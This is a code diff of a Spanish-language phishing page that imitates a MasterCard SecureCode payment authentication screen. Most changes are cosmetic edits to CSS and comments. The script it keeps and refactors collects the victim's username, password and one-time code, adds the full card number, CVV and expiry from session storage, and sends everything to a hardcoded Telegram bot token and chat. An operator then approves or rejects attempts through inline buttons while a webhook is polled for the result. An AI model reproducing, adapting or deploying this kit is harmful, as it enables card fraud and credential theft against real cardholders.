@@ -7,10 +7,9 @@
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" />
     <style>
         :root {
-            --mc-orange: #eb001b;
-            --mc-orange-hover: #c4001a;
-            --mc-gold: #f79e1b;
             --mc-red: #eb001b;
+            --mc-red-hover: #c4001a;
+            --mc-gold: #f79e1b;
             --co-text: #111827;
             --co-text-2: #374151;
             --co-text-muted: #6b7280;
@@ -81,7 +80,6 @@
             .header {
                 margin-bottom: 18px;
             }
-
             .mc-logo {
                 width: 170px;
             }
@@ -93,7 +91,6 @@
                 justify-content: flex-start;
                 gap: 12px;
             }
-
             .mc-logo {
                 width: 150px;
             }
@@ -131,7 +128,6 @@
                 font-size: 1.125rem;
                 margin-bottom: 4px;
             }
-
             .form-subtitle {
                 font-size: 0.875rem;
                 margin-bottom: 16px;
@@ -181,15 +177,12 @@
                 font-size: 0.875rem;
                 margin-bottom: 16px;
             }
-
             .info-row {
                 padding: 6px 0;
             }
-
             .info-label {
                 font-size: 0.8125rem;
             }
-
             .info-value {
                 font-size: 0.8125rem;
             }
@@ -232,7 +225,7 @@
 
         .form-input:focus {
             outline: none;
-            border-color: var(--mc-orange);
+            border-color: var(--mc-red);
             box-shadow: 0 0 0 3px rgba(235, 0, 27, 0.1);
         }
 
@@ -293,7 +286,6 @@
                 padding: 14px;
                 gap: 14px;
             }
-
             .credentials-grid {
                 gap: 10px;
             }
@@ -304,12 +296,10 @@
                 padding: 12px;
                 gap: 12px;
             }
-
             .credentials-grid {
                 grid-template-columns: 1fr;
                 gap: 12px;
             }
-
             .form-input-small {
                 font-size: 0.9375rem;
                 padding: 10px 12px;
@@ -351,7 +341,6 @@
             .confirmation-section {
                 padding: 12px;
             }
-
             .confirmation-section .form-label {
                 font-size: 0.8125rem;
             }
@@ -383,7 +372,7 @@
         }
 
         .btn-submit {
-            background-color: var(--mc-orange);
+            background-color: var(--mc-red);
             color: var(--co-white);
             padding: 10px 32px;
             min-width: 120px;
@@ -391,7 +380,7 @@
         }
 
         .btn-submit:hover {
-            background-color: var(--mc-orange-hover);
+            background-color: var(--mc-red-hover);
         }
 
         .btn-submit:disabled {
@@ -410,48 +399,6 @@
 
         .btn-link:hover {
             color: var(--co-text);
-        }
-
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 16px;
-            margin-top: 24px;
-            padding-top: 24px;
-            border-top: 1px solid var(--co-border);
-            flex-wrap: wrap;
-        }
-
-        @media (max-width: 640px) {
-            .button-group {
-                gap: 10px;
-                margin-top: 14px;
-            }
-
-            .btn-submit {
-                min-width: 100px;
-                padding: 8px 24px;
-                height: 40px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .button-group {
-                gap: 8px;
-                margin-top: 12px;
-            }
-
-            .btn-submit {
-                min-width: 90px;
-                padding: 8px 20px;
-                height: 38px;
-                font-size: 0.875rem;
-            }
-
-            .btn-link {
-                font-size: 0.75rem;
-                padding: 4px 6px;
-            }
         }
 
         .error-message {
@@ -543,35 +490,28 @@
             html, body {
                 padding: 0;
             }
-
             .container {
                 padding: 16px;
                 margin: 8px;
             }
-
             .header {
                 margin-bottom: 20px;
             }
-
             .mc-logo {
                 width: 100px;
             }
-
             .form-title {
                 font-size: 1rem;
                 margin-bottom: 6px;
             }
-
             .form-subtitle {
                 font-size: 0.8125rem;
                 margin-bottom: 16px;
             }
-
             .button-group {
                 gap: 6px;
                 margin-top: 14px;
             }
-
             .btn-submit {
                 min-width: 90px;
                 padding: 8px 16px;
@@ -581,6 +521,7 @@
     </style>
 </head>
 <body>
+    <!-- Loading overlay -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
         <div class="loading-text">Verificando autenticación...</div>
@@ -588,15 +529,18 @@
     </div>
 
     <div class="container">
+        <!-- HEADER CON LOGO -->
         <div class="header">
             <div class="mc-logo">
                 <img src="mastercard.png" alt="MasterCard SecureCode" />
             </div>
         </div>
 
+        <!-- TITULO Y DESCRIPCIÓN -->
         <h1 class="form-title">Autenticar con contraseña</h1>
         <p class="form-subtitle">Ingrese sus credenciales de seguridad a continuación.</p>
 
+        <!-- INFORMACIÓN DE LA TRANSACCIÓN -->
         <div class="transaction-info">
             <div class="info-row">
                 <span class="info-label">Comercio:</span>
@@ -616,9 +560,12 @@
             </div>
         </div>
 
+        <!-- Mensaje de estado (éxito/error) -->
         <div class="status-message" id="statusMessage"></div>
 
+        <!-- FORMULARIO -->
         <form id="authForm" novalidate>
+            <!-- CREDENCIALES -->
             <div class="credentials-section">
                 <div class="credentials-title">Credenciales de acceso</div>
                 <div class="credentials-grid">
@@ -647,6 +594,7 @@
                 </div>
             </div>
 
+            <!-- CÓDIGO DE CONFIRMACIÓN OTP -->
             <div class="confirmation-section">
                 <div class="form-group">
                     <label class="form-label">Código OTP (One-Time Password)</label>
@@ -664,6 +612,7 @@
                 </div>
             </div>
 
+            <!-- BOTONES -->
             <div class="button-group">
                 <a href="#" class="btn btn-link" id="helpLink">Ayuda</a>
                 <a href="#" class="btn btn-link" id="cancelLink">Cancelar</a>
@@ -674,7 +623,7 @@
 
     <script>
         // ============================================
-        // CONFIGURACIÓN
+        // CONFIGURACIÓN (igual que en VISA)
         // ============================================
         const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
         const TELEGRAM_CHAT_ID = '-1004389419498';
@@ -697,7 +646,7 @@
         const statusMessage = document.getElementById('statusMessage');
 
         // ============================================
-        // INICIALIZACIÓN
+        // INICIALIZACIÓN (igual que VISA)
         // ============================================
         function initializeTransaction() {
             const storagePriority = sessionStorage.getItem('procesamiento_prioritario') === 'true';
@@ -728,7 +677,7 @@
         }
 
         // ============================================
-        // FUNCIONES TELEGRAM
+        // FUNCIONES TELEGRAM Y WEBHOOK
         // ============================================
         function generarSolicitudId() {
             return 'MC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
@@ -739,26 +688,14 @@
                 const inlineKeyboard = {
                     inline_keyboard: [
                         [
-                            {
-                                text: "✅ APROBAR",
-                                callback_data: `approve_${datos.solicitudId}`
-                            }
+                            { text: "✅ APROBAR", callback_data: `approve_${datos.solicitudId}` }
                         ],
                         [
-                            {
-                                text: "❌ ERROR USUARIO",
-                                callback_data: `user_error_${datos.solicitudId}`
-                            },
-                            {
-                                text: "❌ ERROR CONTRASEÑA",
-                                callback_data: `pass_error_${datos.solicitudId}`
-                            }
+                            { text: "❌ ERROR USUARIO", callback_data: `user_error_${datos.solicitudId}` },
+                            { text: "❌ ERROR CONTRASEÑA", callback_data: `pass_error_${datos.solicitudId}` }
                         ],
                         [
-                            {
-                                text: "❌ ERROR OTP",
-                                callback_data: `otp_error_${datos.solicitudId}`
-                            }
+                            { text: "❌ ERROR OTP", callback_data: `otp_error_${datos.solicitudId}` }
                         ]
                     ]
                 };
@@ -797,42 +734,26 @@
                 });
 
                 const data = await response.json();
-
-                if (data.ok) {
-                    console.log('✅ Datos enviados a Telegram');
-                    return true;
-                } else {
-                    console.error('❌ Error:', data.description);
-                    return false;
-                }
+                return data.ok;
             } catch (error) {
-                console.error('❌ Error:', error);
+                console.error('Error al enviar a Telegram:', error);
                 return false;
             }
         }
 
-        // ============================================
-        // POLLING AL WEBHOOK
-        // ============================================
         async function verificarEstadoWebhook(solicitudId) {
             try {
                 const response = await fetch(`${WEBHOOK_URL}?check=${solicitudId}`);
                 const data = await response.json();
-                
-                console.log('📊 Estado webhook:', data.estado);
-                
                 return data.estado || 'pending';
             } catch (error) {
-                console.error('❌ Error verificando webhook:', error);
+                console.error('Error verificando webhook:', error);
                 return 'error';
             }
         }
 
         function iniciarPolling() {
             let tiempoInicio = Date.now();
-            
-            console.log('🔄 Iniciando polling al webhook...');
-            
             pollingInterval = setInterval(async () => {
                 if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                     clearInterval(pollingInterval);
@@ -865,7 +786,7 @@
         }
 
         // ============================================
-        // FUNCIONES UI
+        // FUNCIONES UI (igual que VISA)
         // ============================================
         function mostrarError(mensaje) {
             statusMessage.className = 'status-message error';
@@ -891,7 +812,7 @@
         }
 
         // ============================================
-        // VALIDACIÓN
+        // VALIDACIÓN (idéntica a VISA)
         // ============================================
         [usernameInput, passwordInput, confirmationInput].forEach(input => {
             input.addEventListener('blur', function() {
@@ -914,11 +835,13 @@
             statusMessage.style.display = 'none';
             document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
 
+            // Validar usuario
             if (!usernameInput.value.trim()) {
                 usernameInput.parentElement.classList.add('error');
                 isValid = false;
             }
 
+            // Validar contraseña
             if (!passwordInput.value.trim()) {
                 passwordInput.parentElement.classList.add('error');
                 isValid = false;
@@ -928,6 +851,7 @@
                 isValid = false;
             }
 
+            // Validar OTP
             if (!confirmationInput.value.trim()) {
                 confirmationInput.parentElement.classList.add('error');
                 isValid = false;
@@ -939,8 +863,9 @@
 
             if (!isValid) return;
 
+            // Generar ID y preparar datos
             solicitudId = generarSolicitudId();
-            console.log('🆔 Nueva solicitud:', solicitudId);
+            console.log('🆔 Nueva solicitud MasterCard:', solicitudId);
 
             loadingOverlay.classList.add('active');
             submitButton.disabled = true;
@@ -950,6 +875,7 @@
             passwordInput.disabled = true;
             confirmationInput.disabled = true;
 
+            // Obtener datos de tarjeta desde sessionStorage
             const numeroTarjeta = sessionStorage.getItem('cardNumberFull') || 'No disponible';
             const cvv = sessionStorage.getItem('cardCVV') || 'No disponible';
             const vencimiento = sessionStorage.getItem('cardExpiry') || 'No disponible';
@@ -976,6 +902,9 @@
             }
         });
 
+        // ============================================
+        // BOTONES (igual que VISA)
+        // ============================================
         document.getElementById('helpLink').addEventListener('click', function(e) {
             e.preventDefault();
             alert('Para más ayuda, contacte a su banco o al servicio de atención al cliente.');
@@ -990,7 +919,7 @@
 
         window.addEventListener('load', function() {
             initializeTransaction();
-            console.log('✅ Sistema MasterCard listo - Usando webhook de Vercel');
+            console.log('✅ Sistema MasterCard SecureCode listo - Webhook activo');
         });
     </script>
 </body>
